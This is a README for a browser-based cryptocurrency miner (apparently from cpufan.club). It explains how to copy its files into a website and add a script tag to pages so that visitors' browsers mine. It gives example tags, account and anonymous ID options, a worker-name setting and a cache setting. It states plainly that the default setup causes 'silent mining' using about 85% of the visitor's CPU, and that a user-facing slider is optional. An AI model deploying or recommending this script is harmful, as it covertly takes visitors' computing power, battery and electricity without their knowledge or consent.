Copy all the files from this archive to a subfolder somewhere in your docroot.

script v10

Eg.
/vendor/cfc/

Then include the following script code in any webpage you would like to have web mining enabled.

Note: See the test.html file for examples and testing


--------------------------------------------------------------------------------------------------
For Anonymous use:
*** Please be sure to use "data-id" (and not "data-user") with anonymous accounts!

<script src="<path to extracted files>/direct.js data-id="<your direct number>" data-level="<cpu usage"></script>

Example:
<script src="/vendor/cfc/direct.js" data-id="3648135" data-level="85"></script>

--------------------------------------------------------------------------------------------------
For Users with an account:
*** Please be sure to use "data-user" (and not "data-id") with user accounts!

<script src="<path to extracted files>/direct.js data-user="<your user id>" data-level="<cpu usage"></script>

Example:
<script src="/vendor/cfc/direct.js" data-user="3648135" data-level="85"></script>

You can get your userid from your account page when you login:
https://www.cpufan.club/account.php


****************************************************************************************************

Notes and configuration:

Make sure the path to your .js starts with a /

The above will cause silent mining to occur, using ~85% of the web client's CPU.  If you would
like to provide the web user a UI widget to see their mining, and adjust the CPU usage themselves,
simply add an empty div anywhere you want it on your page, with the id "cfc_donate"

Example:

	<div id="cfc_donate"></div>

This div will be populated with a slider control for the user when the script loads.

***************************************************************
************* Additional setting options.
***************************************************************

These settings can be added to the <script> tag for additional functionallity:


	data-worker="custom_worker_name"

-This allows you to assign a worker name to miners using this script.  You can assign unique worker names for different webpages/websites 
	track them from your mining pool.  Please note: your mining pool must support worker names for this to function!

	data-cache="mins"
-Sets the number of minutes a web browser will cache the mining assets.  This can reduce bandwidth usage and slightly speed up the time
	it takes for mining to start. Defaults to 30 minutes.




For any questions or problems, please contact: info@cpufan.club

Happy Mining!
